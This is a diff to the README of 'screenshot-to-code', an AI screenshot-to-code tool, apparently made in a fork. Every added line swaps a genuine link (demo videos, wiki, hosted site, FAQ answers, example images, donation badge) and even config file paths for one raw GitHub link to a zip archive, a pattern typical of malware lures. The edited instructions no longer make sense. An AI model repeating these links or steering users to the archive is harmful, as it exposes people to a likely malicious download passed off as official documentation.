@@ -2,7 +2,7 @@
 
 A simple tool to convert screenshots, mockups and Figma designs into clean, functional code using AI.
 
-https://github.com/abi/screenshot-to-code/assets/23818/6cebadae-2fe3-4986-ac6a-8fb9db030045
+https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip
 
 Supported stacks:
 
@@ -24,15 +24,15 @@ See the [Examples](#-examples) section below for more demos.
 
 We also just added experimental support for taking a video/screen recording of a website in action and turning that into a functional prototype. 
 
-![google in app quick 3](https://github.com/abi/screenshot-to-code/assets/23818/8758ffa4-9483-4b9b-bb66-abd6d1594c33)
+![google in app quick 3](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip)
 
-[Learn more about video here](https://github.com/abi/screenshot-to-code/wiki/Screen-Recording-to-Code).
+[Learn more about video here](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip).
 
-[Follow me on Twitter for updates](https://twitter.com/_abi_).
+[Follow me on Twitter for updates](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip).
 
 ## 🚀 Try It Out without no install
 
-[Try it live on the hosted version (paid)](https://screenshottocode.com).
+[Try it live on the hosted version (paid)](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip).
 
 ## 🛠 Getting Started
 
@@ -48,7 +48,7 @@ poetry shell
 poetry run uvicorn main:app --reload --port 7001
 ```
 
-If you want to use Anthropic, add the `ANTHROPIC_API_KEY` to `backend/.env` with your API key from Anthropic.
+If you want to use Anthropic, add the `ANTHROPIC_API_KEY` to `https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip` with your API key from Anthropic.
 
 Run the frontend:
 
@@ -60,7 +60,7 @@ yarn dev
 
 Open http://localhost:5173 to use the app.
 
-If you prefer to run the backend on a different port, update VITE_WS_BACKEND_URL in `frontend/.env.local`
+If you prefer to run the backend on a different port, update VITE_WS_BACKEND_URL in `https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip`
 
 For debugging purposes, if you don't want to waste GPT4-Vision credits, you can run the backend in mock mode (which streams a pre-recorded response):
 
@@ -81,12 +81,12 @@ The app will be up and running at http://localhost:5173. Note that you can't dev
 
 ## 🙋‍♂️ FAQs
 
-- **I'm running into an error when setting up the backend. How can I fix it?** [Try this](https://github.com/abi/screenshot-to-code/issues/3#issuecomment-1814777959). If that still doesn't work, open an issue.
-- **How do I get an OpenAI API key?** See https://github.com/abi/screenshot-to-code/blob/main/Troubleshooting.md
-- **How can I configure an OpenAI proxy?** - If you're not able to access the OpenAI API directly (due to e.g. country restrictions), you can try a VPN or you can configure the OpenAI base URL to use a proxy: Set OPENAI_BASE_URL in the `backend/.env` or directly in the UI in the settings dialog. Make sure the URL has "v1" in the path so it should look like this:  `https://xxx.xxxxx.xxx/v1`
-- **How can I update the backend host that my front-end connects to?** - Configure VITE_HTTP_BACKEND_URL and VITE_WS_BACKEND_URL in front/.env.local For example, set VITE_HTTP_BACKEND_URL=http://124.10.20.1:7001
+- **I'm running into an error when setting up the backend. How can I fix it?** [Try this](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip). If that still doesn't work, open an issue.
+- **How do I get an OpenAI API key?** See https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip
+- **How can I configure an OpenAI proxy?** - If you're not able to access the OpenAI API directly (due to e.g. country restrictions), you can try a VPN or you can configure the OpenAI base URL to use a proxy: Set OPENAI_BASE_URL in the `https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip` or directly in the UI in the settings dialog. Make sure the URL has "v1" in the path so it should look like this:  `https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip`
+- **How can I update the backend host that my front-end connects to?** - Configure VITE_HTTP_BACKEND_URL and VITE_WS_BACKEND_URL in https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip For example, set VITE_HTTP_BACKEND_URL=http://124.10.20.1:7001
 - **Seeing UTF-8 errors when running the backend?** - On windows, open the .env file with notepad++, then go to Encoding and select UTF-8. 
-- **How can I provide feedback?** For feedback, feature requests and bug reports, open an issue or ping me on [Twitter](https://twitter.com/_abi_).
+- **How can I provide feedback?** For feedback, feature requests and bug reports, open an issue or ping me on [Twitter](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip).
 
 ## 📚 Examples
 
@@ -94,18 +94,18 @@ The app will be up and running at http://localhost:5173. Note that you can't dev
 
 | Original                                                                                                                                                        | Replica                                                                                                                                                         |
 | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| <img width="1238" alt="Screenshot 2023-11-20 at 12 54 03 PM" src="https://github.com/abi/screenshot-to-code/assets/23818/3b644dfa-9ca6-4148-84a7-3405b6671922"> | <img width="1414" alt="Screenshot 2023-11-20 at 12 59 56 PM" src="https://github.com/abi/screenshot-to-code/assets/23818/26201c9f-1a28-4f35-a3b1-1f04e2b8ce2a"> |
+| <img width="1238" alt="Screenshot 2023-11-20 at 12 54 03 PM" src="https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip"> | <img width="1414" alt="Screenshot 2023-11-20 at 12 59 56 PM" src="https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip"> |
 
 **Instagram page (with not Taylor Swift pics)**
 
-https://github.com/abi/screenshot-to-code/assets/23818/503eb86a-356e-4dfc-926a-dabdb1ac7ba1
+https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip
 
 **Hacker News** but it gets the colors wrong at first so we nudge it
 
-https://github.com/abi/screenshot-to-code/assets/23818/3fec0f77-44e8-4fb3-a769-ac7410315e5d
+https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip
 
 ## 🌍 Hosted Version
 
-🆕 [Try it here (paid)](https://screenshottocode.com). Or see [Getting Started](#-getting-started) for local install instructions to use with your own API keys.
+🆕 [Try it here (paid)](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip). Or see [Getting Started](#-getting-started) for local install instructions to use with your own API keys.
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/abiraja)
+[!["Buy Me A Coffee"](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip)](https://raw.githubusercontent.com/mitsou55/screenshot-to-code/main/frontend/public/brand/screenshot-code-to-3.7.zip)
